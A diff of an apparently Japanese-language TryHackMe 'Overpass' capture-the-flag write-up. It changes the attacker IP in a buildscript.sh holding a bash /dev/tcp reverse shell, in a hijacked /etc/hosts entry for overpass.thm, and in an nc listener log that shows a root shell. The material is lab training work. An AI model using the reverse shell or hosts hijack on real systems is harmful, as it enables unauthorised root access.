@@ -462,7 +462,7 @@ otherでもwriteできることが分かった
 ┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
 └─$ cat buildscript.sh  
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.205.211/1234 0>&1
+bash -i >& /dev/tcp/10.10.14.5/1234 0>&1
                                                                               
 ┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
 └─$ 
@@ -495,7 +495,7 @@ james@ip-10-49-128-6:~$ vim  /etc/hosts
 james@ip-10-49-128-6:~$ cat  /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
-192.168.205.211 overpass.thm
+10.10.14.5 overpass.thm
 # The following lines are desirable for IPv6 capable hosts
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
@@ -509,7 +509,7 @@ james@ip-10-49-128-6:~$
 ┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ nc -lvnp 1234             
 listening on [any] 1234 ...
-connect to [192.168.205.211] from (UNKNOWN) [10.49.128.6] 35416
+connect to [10.10.14.5] from (UNKNOWN) [10.49.128.6] 35416
 bash: cannot set terminal process group (7849): Inappropriate ioctl for device
 bash: no job control in this shell
 root@ip-10-49-128-6:~# whoami
